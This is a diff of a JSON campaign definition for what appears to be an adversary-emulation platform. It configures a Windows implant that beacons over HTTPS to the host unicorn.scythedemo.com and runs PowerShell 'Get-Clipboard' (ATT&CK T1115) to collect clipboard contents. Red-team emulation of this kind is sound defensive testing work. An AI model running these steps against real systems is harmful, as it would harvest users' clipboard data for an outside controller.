@@ -7,10 +7,7 @@
         "operating_system_name": "windows",
         "script": {
             "0": {
-                "conf": {
-                    "--cp": "unicorn.scythedemo.com:443",
-                    "--secure": true
-                },
+                "conf": "--cp unicorn.scythedemo.com:443 --secure true",
                 "module": "https",
                 "type": "initialization"
             },
@@ -33,6 +30,36 @@
                 "type": "message"
             },
             "3": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell Get-Clipboard -Format text",
+                "rtags": [
+                    "att&ck-technique:T1115"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "6": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Get-Clipboard -Format text",
+                "rtags": [
+                    "att&ck-technique:T1115"
+                ],
+                "type": "message"
+            },
+            "7": {
                 "module": "controller",
                 "request": "--shutdown",
                 "rtags": [
